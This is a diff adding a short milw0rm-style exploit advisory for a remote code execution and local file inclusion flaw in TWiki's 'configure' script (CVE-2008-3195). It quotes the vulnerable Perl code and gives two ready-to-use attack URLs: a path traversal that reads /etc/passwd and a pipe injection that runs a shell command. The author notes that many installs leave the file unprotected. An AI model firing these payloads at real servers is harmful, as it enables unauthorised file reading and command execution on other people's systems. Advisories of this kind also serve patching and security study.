@@ -1,0 +1,33 @@
+#-----------webDEViL - [ w3bd3vil [at] gmail [dot] com ] -----------#
+#-----------TWiki Remote Code Execution <= 4.2.2--------------------#
+
+# ----------developers site: http://www.twiki.org-------------------#
+# ----------CVE Id(s)      : CVE-2008-3195--------------------------#
+
+# http://twiki.org/cgi-bin/view/Codev/DownloadTWiki#4_2_3_Bugfix_Highlights
+
+The "configure" file in TWiki's bin folder is vulnerable to code execution and local file inclusion.
+
+According to TWiki's documentation this file is meant to be protected with .htaccess, but many a times you find it is not ;)
+
+Vulnerable code:
+
+if( $action eq 'image' ) {
+    # SMELL: this call is correct, but causes a perl error
+
+    # on some versions of CGI.pm
+    # print $query->header(-type => $query->param('type'));
+    # So use this instead:
+    print 'Content-type: '.$query->param('type')."\n\n";
+
+    if( open(F, 'logos/'.$query->param('image' ))) {
+        local $/ = undef;
+        print <F>;
+        close(F);
+    }
+
+http://localhost/twiki/bin/configure?action=image;image=../../../../../../../etc/passwd;type=text/plain
+
+http://localhost/twiki/bin/configure?action=image;image=|uname -a|;type=text/plain
+
+# milw0rm.com [2008-09-21]
